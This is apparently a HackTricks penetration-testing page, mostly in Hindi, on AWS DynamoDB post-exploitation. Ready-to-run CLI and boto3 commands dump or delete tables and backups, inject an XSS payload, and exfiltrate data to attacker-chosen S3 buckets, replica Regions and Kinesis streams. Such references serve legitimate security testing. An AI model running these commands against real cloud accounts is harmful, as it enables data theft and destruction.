# AWS - DynamoDB Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## DynamoDB

अधिक जानकारी के लिए देखें:

{{#ref}}
../aws-services/aws-dynamodb-enum.md
{{#endref}}

### `dynamodb:BatchGetItem`

इस अनुमति के साथ एक हमलावर **तालिकाओं से प्राथमिक कुंजी द्वारा आइटम प्राप्त** कर सकेगा (आप सीधे तालिका का सारा डेटा नहीं माँग सकते)। इसका मतलब है कि आपको प्राथमिक कुंजियाँ पता होनी चाहिए (आप यह तालिका के मेटाडेटा को प्राप्त करके पता कर सकते हैं (`describe-table`) )।

{{#tabs }}
{{#tab name="json file" }}
```bash
aws dynamodb batch-get-item --request-items file:///tmp/a.json

// With a.json
{
"ProductCatalog" : { // This is the table name
"Keys": [
{
"Id" : { // Primary keys name
"N": "205" // Value to search for, you could put here entries from 1 to 1000 to dump all those
}
}
]
}
}
```
{{#endtab }}

{{#tab name="inline" }}
```bash
aws dynamodb batch-get-item \
--request-items '{"TargetTable": {"Keys": [{"Id": {"S": "item1"}}, {"Id": {"S": "item2"}}]}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**Potential Impact:** टेबल में संवेदनशील जानकारी खोजकर अप्रत्यक्ष privesc

### `dynamodb:GetItem`

**पिछली अनुमतियों के समान** यह अनुमति देता है कि संभावित attacker केवल 1 टेबल से एंट्री की प्राथमिक कुंजी दिए जाने पर मान पढ़ सके:
```json
aws dynamodb get-item --table-name ProductCatalog --key  file:///tmp/a.json

// With a.json
{
"Id" : {
"N": "205"
}
}
```
इस अनुमति के साथ यह भी संभव है कि **`transact-get-items`** विधि का उपयोग इस तरह किया जा सकता है:
```json
aws dynamodb transact-get-items \
--transact-items file:///tmp/a.json

// With a.json
[
{
"Get": {
"Key": {
"Id": {"N": "205"}
},
"TableName": "ProductCatalog"
}
}
]
```
**Potential Impact:** तालिका में संवेदनशील जानकारी का पता लगाकर अप्रत्यक्ष privesc

### `dynamodb:Query`

**Similar to the previous permissions** यह अनुमति देता है कि एक संभावित attacker, दिए गए entry की primary key के आधार पर केवल 1 table से मान पढ़ सके। यह [subset of comparisons](https://docs.aws.amazon.com/amazondynamodb/latest/APIReference/API_Condition.html) का प्रयोग करने देता है, लेकिन primary key (जो मौजूद होना चाहिए) के साथ केवल "EQ" तुलना की अनुमति है, इसलिए आप किसी अनुरोध में पूरा DB प्राप्त करने के लिए तुलना का उपयोग नहीं कर सकते।

{{#tabs }}
{{#tab name="json file" }}
```bash
aws dynamodb query --table-name ProductCatalog --key-conditions file:///tmp/a.json

// With a.json
{
"Id" : {
"ComparisonOperator":"EQ",
"AttributeValueList": [ {"N": "205"} ]
}
}
```
{{#endtab }}

{{#tab name="inline" }}
```bash
aws dynamodb query \
--table-name TargetTable \
--key-condition-expression "AttributeName = :value" \
--expression-attribute-values '{":value":{"S":"TargetValue"}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**संभावित प्रभाव:** अप्रत्यक्ष privesc — तालिका में संवेदनशील जानकारी का पता लगाकर

### `dynamodb:Scan`

आप इस अनुमति का उपयोग करके पूरी तालिका को आसानी से dump कर सकते हैं।
```bash
aws dynamodb scan --table-name <t_name> #Get data inside the table
```
**संभावित प्रभाव:** टेबल में संवेदनशील जानकारी का पता लगाकर अप्रत्यक्ष privesc

### `dynamodb:PartiQLSelect`

आप इस अनुमति का उपयोग करके **पूरी टेबल आसानी से dump कर सकते हैं**।
```bash
aws dynamodb execute-statement \
--statement "SELECT * FROM ProductCatalog"
```
यह अनुमति `batch-execute-statement` जैसे कमांड भी चलाने की अनुमति देती है:
```bash
aws dynamodb batch-execute-statement \
--statements '[{"Statement": "SELECT * FROM ProductCatalog WHERE Id = 204"}]'
```
लेकिन आपको primary key के साथ एक मान निर्दिष्ट करना होगा, इसलिए यह इतना उपयोगी नहीं है।

**Potential Impact:** तालिका में संवेदनशील जानकारी का पता लगाकर अप्रत्यक्ष privesc

### `dynamodb:ExportTableToPointInTime|(dynamodb:UpdateContinuousBackups)`

यह अनुमति एक हमलावर को **पूरी तालिका को अपनी पसंद के S3 bucket में export करने** की अनुमति देगी:
```bash
aws dynamodb export-table-to-point-in-time \
--table-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable \
--s3-bucket <attacker_s3_bucket> \
--s3-prefix <optional_prefix> \
--export-time <point_in_time> \
--region <region>
```
ध्यान दें कि यह काम करने के लिए table में point-in-time-recovery सक्षम होना चाहिए, आप यह जांच सकते हैं कि table में यह सक्षम है या नहीं:
```bash
aws dynamodb describe-continuous-backups \
--table-name <tablename>
```
यदि यह सक्षम नहीं है, तो आपको इसे **सक्षम करना** होगा और इसके लिए आपको **`dynamodb:ExportTableToPointInTime`** अनुमति चाहिए:
```bash
aws dynamodb update-continuous-backups \
--table-name <value> \
--point-in-time-recovery-specification PointInTimeRecoveryEnabled=true
```
**Potential Impact:** table में संवेदनशील जानकारी का पता लगाकर अप्रत्यक्ष privesc

### `dynamodb:CreateTable`, `dynamodb:RestoreTableFromBackup`, (`dynamodb:CreateBackup)`

इन permissions के साथ, एक attacker **बैकअप से एक नया table बना सकता है** (या यहाँ तक कि एक backup बना कर उसे किसी दूसरे table में restore भी कर सकता है)। फिर, आवश्यक permissions के साथ, वह बैकअप्स से उन **जानकारियों** की जाँच कर सकेगा जो **production table में अब मौजूद नहीं रह सकतीं**।
```bash
aws dynamodb restore-table-from-backup \
--backup-arn <source-backup-arn> \
--target-table-name <new-table-name> \
--region <region>
```
**Potential Impact:** Indirect privesc द्वारा तालिका बैकअप में संवेदनशील जानकारी का पता लगाना

### `dynamodb:PutItem`

यह अनुमति उपयोगकर्ताओं को तालिका में **नई आइटम जोड़ने या किसी मौजूदा आइटम को नई आइटम से बदलने** की अनुमति देती है। यदि समान प्राथमिक कुंजी वाला कोई आइटम पहले से मौजूद है, तो **पूरा आइटम नई आइटम से बदल दिया जाएगा**। यदि प्राथमिक कुंजी मौजूद नहीं है, तो निर्दिष्ट प्राथमिक कुंजी के साथ एक नया आइटम **बनाया जाएगा**।

{{#tabs }}
{{#tab name="XSS Example" }}
```bash
## Create new item with XSS payload
aws dynamodb put-item --table <table_name> --item file://add.json
### With add.json:
{
"Id": {
"S": "1000"
},
"Name": {
"S":  "Marc"
},
"Description": {
"S": "<script>alert(1)</script>"
}
}
```
{{#endtab }}

{{#tab name="AI Example" }}
```bash
aws dynamodb put-item \
--table-name ExampleTable \
--item '{"Id": {"S": "1"}, "Attribute1": {"S": "Value1"}, "Attribute2": {"S": "Value2"}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**Potential Impact:** DynamoDB table में डेटा जोड़ने/संशोधित करने में सक्षम होने से आगे की vulnerabilities/bypasses का Exploitation

### `dynamodb:UpdateItem`

यह अनुमति उपयोगकर्ताओं को किसी item के मौजूदा attributes को **modify** करने या item में नए attributes **add** करने की अनुमति देती है। यह पूरे item को **replace** नहीं करता; यह केवल निर्दिष्ट attributes को अपडेट करता है। अगर तालिका में प्राथमिक कुंजी मौजूद नहीं है, तो ऑपरेशन निर्दिष्ट प्राथमिक कुंजी के साथ एक **नई आइटम बनाएगा** और update expression में बताए गए attributes सेट करेगा।

{{#tabs }}
{{#tab name="XSS Example" }}
```bash
## Update item with XSS payload
aws dynamodb update-item --table <table_name> \
--key file://key.json --update-expression "SET Description = :value" \
--expression-attribute-values file://val.json
### With key.json:
{
"Id": {
"S": "1000"
}
}
### and val.json
{
":value": {
"S": "<script>alert(1)</script>"
}
}
```
{{#endtab }}

{{#tab name="AI Example" }}
```bash
aws dynamodb update-item \
--table-name ExampleTable \
--key '{"Id": {"S": "1"}}' \
--update-expression "SET Attribute1 = :val1, Attribute2 = :val2" \
--expression-attribute-values '{":val1": {"S": "NewValue1"}, ":val2": {"S": "NewValue2"}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**Potential Impact:** DynamoDB table में डेटा जोड़ने/संपादित करने में सक्षम होने के कारण अन्य कमजोरियों/बायपास का शोषण

### `dynamodb:DeleteTable`

इस अनुमति वाले हमलावर इस अधिकार का उपयोग करके **DynamoDB table को हटा सकता है, जिससे डेटा हानि होगी**।
```bash
aws dynamodb delete-table \
--table-name TargetTable \
--region <region>
```
**संभावित प्रभाव**: हटाए गए टेबल पर निर्भर सेवाओं में डेटा हानि और व्यवधान।

### `dynamodb:DeleteBackup`

इस अनुमति वाले attacker **DynamoDB बैकअप को हटा सकते हैं, जो आपदा पुनर्प्राप्ति स्थिति में संभावित रूप से डेटा हानि का कारण बन सकता है।**
```bash
aws dynamodb delete-backup \
--backup-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable/backup/BACKUP_ID \
--region <region>
```
**Potential impact**: डेटा क्षति और आपदा पुनर्प्राप्ति परिदृश्य के दौरान बैकअप से पुनर्प्राप्ति करने में असमर्थता।

### `dynamodb:StreamSpecification`, `dynamodb:UpdateTable`, `dynamodb:DescribeStream`, `dynamodb:GetShardIterator`, `dynamodb:GetRecords`

> [!NOTE]
> TODO: जाँचें कि क्या यह वास्तव में काम करता है

An attacker with these permissions can **DynamoDB table पर एक stream सक्षम कर सकता है, table को अपडेट करके परिवर्तन स्ट्रीमिंग शुरू कर सकता है, और फिर stream को access करके रियल-टाइम में table के परिवर्तनों की निगरानी कर सकता है**। यह attacker को डेटा परिवर्तनों की निगरानी और exfiltrate करने की अनुमति देता है, संभावित रूप से data leakage की ओर ले जाता है।

1. DynamoDB table पर stream सक्षम करें:
```bash
aws dynamodb update-table \
--table-name TargetTable \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES \
--region <region>
```
2. स्ट्रीम का वर्णन करें ताकि ARN और अन्य विवरण प्राप्त किए जा सकें:
```bash
aws dynamodb describe-stream \
--table-name TargetTable \
--region <region>
```
3. stream ARN का उपयोग करके shard iterator प्राप्त करें:
```bash
aws dynamodbstreams get-shard-iterator \
--stream-arn <stream_arn> \
--shard-id <shard_id> \
--shard-iterator-type LATEST \
--region <region>
```
4. shard iterator का उपयोग करके stream से डेटा तक पहुँचें और उसे exfiltrate करें:
```bash
aws dynamodbstreams get-records \
--shard-iterator <shard_iterator> \
--region <region>
```
**Potential impact**: वास्तविक समय की निगरानी और DynamoDB तालिका में परिवर्तनों का data leakage.

### `dynamodb:UpdateItem` और `ReturnValues=ALL_OLD` के माध्यम से आइटम पढ़ें

एक हमलावर जिसके पास किसी टेबल पर केवल `dynamodb:UpdateItem` अनुमति है, सामान्य पढ़ने की अनुमतियाँ (`GetItem`/`Query`/`Scan`) होने के बिना भी एक हानिरहित अपडेट करके और `--return-values ALL_OLD` अनुरोध करके आइटम पढ़ सकता है। DynamoDB प्रतिक्रिया के `Attributes` फ़ील्ड में आइटम की पूर्ण pre-update image लौटाएगा (यह RCUs का उपभोग नहीं करता)।

- न्यूनतम अनुमतियाँ: लक्ष्य तालिका/की पर `dynamodb:UpdateItem`।
- पूर्वापेक्षाएँ: आपको आइटम की प्राथमिक कुंजी पता होनी चाहिए।

उदाहरण (एक हानिरहित attribute जोड़ता है और response में previous item को exfiltrates करता है):
```bash
aws dynamodb update-item \
--table-name <TargetTable> \
--key '{"<PKName>":{"S":"<PKValue>"}}' \
--update-expression 'SET #m = :v' \
--expression-attribute-names '{"#m":"exfil_marker"}' \
--expression-attribute-values '{":v":{"S":"1"}}' \
--return-values ALL_OLD \
--region <region>
```
CLI प्रतिक्रिया में एक `Attributes` ब्लॉक शामिल होगा जिसमें पूरा पिछला आइटम (सभी attributes) होगा, जो प्रभावी रूप से write-only एक्सेस से एक read primitive प्रदान करता है।

**Potential Impact:** केवल write permissions के साथ किसी table से arbitrary items पढ़ने की क्षमता, जिससे जब primary keys ज्ञात हों तो संवेदनशील डेटा exfiltration संभव हो जाता है।


### `dynamodb:UpdateTable (replica-updates)` | `dynamodb:CreateTableReplica`

एक नया replica Region जोड़कर stealth exfiltration की जा सकती है किसी DynamoDB Global Table (version 2019.11.21) में। यदि कोई principal एक regional replica जोड़ सकता है, तो पूरा table attacker-चयनित Region में replicate हो जाएगा, जहाँ से attacker सभी items पढ़ सकता है।

{{#tabs }}
{{#tab name="PoC (default DynamoDB-managed KMS)" }}
```bash
# Add a new replica Region (from primary Region)
aws dynamodb update-table \
--table-name <TableName> \
--replica-updates '[{"Create": {"RegionName": "<replica-region>"}}]' \
--region <primary-region>

# Wait until the replica table becomes ACTIVE in the replica Region
aws dynamodb describe-table --table-name <TableName> --region <replica-region> --query 'Table.TableStatus'

# Exfiltrate by reading from the replica Region
aws dynamodb scan --table-name <TableName> --region <replica-region>
```
{{#endtab }}
{{#tab name="PoC (customer-managed KMS)" }}
```bash
# Specify the CMK to use in the replica Region
aws dynamodb update-table \
--table-name <TableName> \
--replica-updates '[{"Create": {"RegionName": "<replica-region>", "KMSMasterKeyId": "arn:aws:kms:<replica-region>:<account-id>:key/<cmk-id>"}}]' \
--region <primary-region>
```
{{#endtab }}
{{#endtabs }}

अनुमतियाँ: `dynamodb:UpdateTable` (with `replica-updates`) or `dynamodb:CreateTableReplica` लक्षित टेबल पर। यदि CMK का उपयोग replica में किया गया है, तो उस key के लिए KMS अनुमतियाँ आवश्यक हो सकती हैं।

संभावित प्रभाव: किसी हमलावर-नियंत्रित Region में पूरा-टेबल replication, जिससे गुप्त रूप से डेटा exfiltration हो सकता है।

### `dynamodb:TransactWriteItems` (failed condition के जरिए पढ़ना + `ReturnValuesOnConditionCheckFailure=ALL_OLD`)

Transactional write privileges वाला हमलावर किसी मौजूदा आइटम के पूरे attributes exfiltrate कर सकता है, अगर वह `TransactWriteItems` के अंदर एक `Update` अंजाम देता है जो जानबूझकर `ConditionExpression` पर असफल हो और साथ में `ReturnValuesOnConditionCheckFailure=ALL_OLD` सेट किया गया हो। असफलता पर, DynamoDB लेन-देन रद्द करने के कारणों में पहले के attributes शामिल कर देता है, जिससे लक्षित keys के लिए केवल-लेखन पहुँच को प्रभावी रूप से पढ़ने की पहुँच में बदल दिया जाता है।

{{#tabs }}
{{#tab name="PoC (AWS CLI >= supports cancellation reasons)" }}
```bash
# Create the transaction input (list form for --transact-items)
cat > /tmp/tx_items.json << 'JSON'
[
{
"Update": {
"TableName": "<TableName>",
"Key": {"<PKName>": {"S": "<PKValue>"}},
"UpdateExpression": "SET #m = :v",
"ExpressionAttributeNames": {"#m": "marker"},
"ExpressionAttributeValues": {":v": {"S": "x"}},
"ConditionExpression": "attribute_not_exists(<PKName>)",
"ReturnValuesOnConditionCheckFailure": "ALL_OLD"
}
}
]
JSON

# Execute. Newer AWS CLI versions support returning cancellation reasons
aws dynamodb transact-write-items \
--transact-items file:///tmp/tx_items.json \
--region <region> \
--return-cancellation-reasons
# The command fails with TransactionCanceledException; parse cancellationReasons[0].Item
```
{{#endtab }}
{{#tab name="PoC (boto3)" }}
```python
import boto3
c=boto3.client('dynamodb',region_name='<region>')
try:
c.transact_write_items(TransactItems=[{ 'Update': {
'TableName':'<TableName>',
'Key':{'<PKName>':{'S':'<PKValue>'}},
'UpdateExpression':'SET #m = :v',
'ExpressionAttributeNames':{'#m':'marker'},
'ExpressionAttributeValues':{':v':{'S':'x'}},
'ConditionExpression':'attribute_not_exists(<PKName>)',
'ReturnValuesOnConditionCheckFailure':'ALL_OLD'}}])
except c.exceptions.TransactionCanceledException as e:
print(e.response['CancellationReasons'][0]['Item'])
```
{{#endtab }}
{{#endtabs }}

अनुमतियाँ: `dynamodb:TransactWriteItems` on the target table (and the underlying item). No read permissions are required।

संभावित प्रभाव: केवल transactional write privileges का उपयोग करके, लौटाए गए cancellation reasons के माध्यम से, एक table से arbitrary items (primary key द्वारा) पढ़ सकते हैं।


### `dynamodb:UpdateTable` + `dynamodb:UpdateItem` + `dynamodb:Query` on GSI

एक low-entropy attribute पर `ProjectionType=ALL` के साथ Global Secondary Index (GSI) बनाकर read प्रतिबंध बायपास करें, उस attribute को सभी items में एक constant value पर सेट करें, फिर full items प्राप्त करने के लिए index को `Query` करें। यह तब भी काम करता है जब base table पर `Query`/`Scan` deny किया गया हो, बशर्ते आप index ARN को query कर सकें।

- न्यूनतम अनुमतियाँ:
- `dynamodb:UpdateTable` टार्गेट टेबल पर (GSI बनाने के लिए जिसमें `ProjectionType=ALL` होगा)।
- `dynamodb:UpdateItem` टार्गेट टेबल की keys पर (प्रत्येक item पर indexed attribute सेट करने के लिए)।
- `dynamodb:Query` index resource ARN पर (`arn:aws:dynamodb:<region>:<account-id>:table/<TableName>/index/<IndexName>`).

कदम (PoC in us-east-1):
```bash
# 1) Create table and seed items (without the future GSI attribute)
aws dynamodb create-table --table-name HTXIdx \
--attribute-definitions AttributeName=id,AttributeType=S \
--key-schema AttributeName=id,KeyType=HASH \
--billing-mode PAY_PER_REQUEST --region us-east-1
aws dynamodb wait table-exists --table-name HTXIdx --region us-east-1
for i in 1 2 3 4 5; do \
aws dynamodb put-item --table-name HTXIdx \
--item "{\"id\":{\"S\":\"$i\"},\"secret\":{\"S\":\"sec-$i\"}}" \
--region us-east-1; done

# 2) Add GSI on attribute X with ProjectionType=ALL
aws dynamodb update-table --table-name HTXIdx \
--attribute-definitions AttributeName=X,AttributeType=S \
--global-secondary-index-updates '[{"Create":{"IndexName":"ExfilIndex","KeySchema":[{"AttributeName":"X","KeyType":"HASH"}],"Projection":{"ProjectionType":"ALL"}}}]' \
--region us-east-1
# Wait for index to become ACTIVE
aws dynamodb describe-table --table-name HTXIdx --region us-east-1 \
--query 'Table.GlobalSecondaryIndexes[?IndexName==`ExfilIndex`].IndexStatus'

# 3) Set X="dump" for each item (only UpdateItem on known keys)
for i in 1 2 3 4 5; do \
aws dynamodb update-item --table-name HTXIdx \
--key "{\"id\":{\"S\":\"$i\"}}" \
--update-expression 'SET #x = :v' \
--expression-attribute-names '{"#x":"X"}' \
--expression-attribute-values '{":v":{"S":"dump"}}' \
--region us-east-1; done

# 4) Query the index by the constant value to retrieve full items
aws dynamodb query --table-name HTXIdx --index-name ExfilIndex \
--key-condition-expression '#x = :v' \
--expression-attribute-names '{"#x":"X"}' \
--expression-attribute-values '{":v":{"S":"dump"}}' \
--region us-east-1
```
**संभावित प्रभाव:** नए बनाए गए GSI को क्वेरी करके जो सभी attributes को प्रोजेक्ट करता है, full table exfiltration संभव है, यहां तक कि जब base table read APIs deny हों।


### `dynamodb:EnableKinesisStreamingDestination` (Kinesis Data Streams के माध्यम से लगातार exfiltration)

DynamoDB Kinesis streaming destinations का दुरुपयोग करके तालिका के परिवर्तन लगातार attacker-controlled Kinesis Data Stream में exfiltrate किए जा सकते हैं। एक बार सक्षम होने पर, हर INSERT/MODIFY/REMOVE event लगभग रीयल-टाइम में stream को फॉरवर्ड हो जाता है, और इसके लिए table पर read permissions की आवश्यकता नहीं होती।

न्यूनतम permissions (attacker):
- `dynamodb:EnableKinesisStreamingDestination` लक्षित तालिका पर
- वैकल्पिक रूप से `dynamodb:DescribeKinesisStreamingDestination`/`dynamodb:DescribeTable` status मॉनिटर करने के लिए
- attacker-owned Kinesis stream पर records को consume करने के लिए read permissions: `kinesis:ListShards`, `kinesis:GetShardIterator`, `kinesis:GetRecords`

<details>
<summary>PoC (us-east-1)</summary>
```bash
# 1) Prepare: create a table and seed one item
aws dynamodb create-table --table-name HTXKStream \
--attribute-definitions AttributeName=id,AttributeType=S \
--key-schema AttributeName=id,KeyType=HASH \
--billing-mode PAY_PER_REQUEST --region us-east-1
aws dynamodb wait table-exists --table-name HTXKStream --region us-east-1
aws dynamodb put-item --table-name HTXKStream \
--item file:///tmp/htx_item1.json --region us-east-1
# /tmp/htx_item1.json
# {"id":{"S":"a1"},"secret":{"S":"s-1"}}

# 2) Create attacker Kinesis Data Stream
aws kinesis create-stream --stream-name htx-ddb-exfil --shard-count 1 --region us-east-1
aws kinesis wait stream-exists --stream-name htx-ddb-exfil --region us-east-1

# 3) Enable the DynamoDB -> Kinesis streaming destination
STREAM_ARN=$(aws kinesis describe-stream-summary --stream-name htx-ddb-exfil \
--region us-east-1 --query StreamDescriptionSummary.StreamARN --output text)
aws dynamodb enable-kinesis-streaming-destination \
--table-name HTXKStream --stream-arn "$STREAM_ARN" --region us-east-1
# Optionally wait until ACTIVE
aws dynamodb describe-kinesis-streaming-destination --table-name HTXKStream \
--region us-east-1 --query KinesisDataStreamDestinations[0].DestinationStatus

# 4) Generate changes on the table
aws dynamodb put-item --table-name HTXKStream \
--item file:///tmp/htx_item2.json --region us-east-1
# /tmp/htx_item2.json
# {"id":{"S":"a2"},"secret":{"S":"s-2"}}
aws dynamodb update-item --table-name HTXKStream \
--key file:///tmp/htx_key_a1.json \
--update-expression "SET #i = :v" \
--expression-attribute-names {#i:info} \
--expression-attribute-values {:v:{S:updated}} \
--region us-east-1
# /tmp/htx_key_a1.json -> {"id":{"S":"a1"}}

# 5) Consume from Kinesis to observe DynamoDB images
SHARD=$(aws kinesis list-shards --stream-name htx-ddb-exfil --region us-east-1 \
--query Shards[0].ShardId --output text)
IT=$(aws kinesis get-shard-iterator --stream-name htx-ddb-exfil --shard-id "$SHARD" \
--shard-iterator-type TRIM_HORIZON --region us-east-1 --query ShardIterator --output text)
aws kinesis get-records --shard-iterator "$IT" --limit 10 --region us-east-1 > /tmp/krec.json
# Decode one record (Data is base64-encoded)
jq -r .Records[0].Data /tmp/krec.json | base64 --decode | jq .

# 6) Cleanup (recommended)
aws dynamodb disable-kinesis-streaming-destination \
--table-name HTXKStream --stream-arn "$STREAM_ARN" --region us-east-1 || true
aws kinesis delete-stream --stream-name htx-ddb-exfil --enforce-consumer-deletion --region us-east-1 || true
aws dynamodb delete-table --table-name HTXKStream --region us-east-1 || true
```
</details>

**Potential Impact:** लगातार, लगभग रियल-टाइम exfiltration — तालिका के परिवर्तनों का हमलावर-नियंत्रित Kinesis स्ट्रीम पर बाहर जाना, बिना तालिका पर सीधे पढ़ने के ऑपरेशन किए।

{{#include ../../../banners/hacktricks-training.md}}
